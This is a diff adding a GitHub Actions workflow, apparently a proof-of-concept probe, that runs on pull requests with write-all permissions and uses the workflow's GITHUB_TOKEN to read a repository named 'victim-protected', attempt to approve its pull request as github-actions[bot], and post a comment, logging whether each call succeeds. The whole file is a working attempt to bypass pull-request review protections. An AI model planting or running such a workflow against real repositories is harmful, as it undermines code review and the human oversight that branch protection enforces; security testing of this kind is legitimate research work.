@@ -1,0 +1,22 @@
+name: tokenprobe
+on: pull_request
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: token capability probe
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          echo "=== repo object as seen by GITHUB_TOKEN ==="
+          curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/IRONMOSSVICORG/victim-protected -o repo.json -w "HTTP_REPO=%{http_code}\n"
+          python3 -c "import json;d=json.load(open('repo.json'));print('PERMISSIONS=',d.get('permissions'))"
+          echo "=== attempt APPROVE review as github-actions[bot] ==="
+          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -d '{"event":"APPROVE","body":"probe: fork workflow token approval attempt"}' https://api.github.com/repos/IRONMOSSVICORG/victim-protected/pulls/2/reviews -o rev.json -w "HTTP_REVIEW=%{http_code}\n"
+          echo "REVIEW_BODY:"; head -c 400 rev.json; echo
+          echo "=== attempt comment write ==="
+          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -d '{"body":"probe: fork workflow token comment attempt"}' https://api.github.com/repos/IRONMOSSVICORG/victim-protected/issues/2/comments -o cm.json -w "HTTP_COMMENT=%{http_code}\n"
+          echo "COMMENT_BODY:"; head -c 200 cm.json; echo
+          exit 0
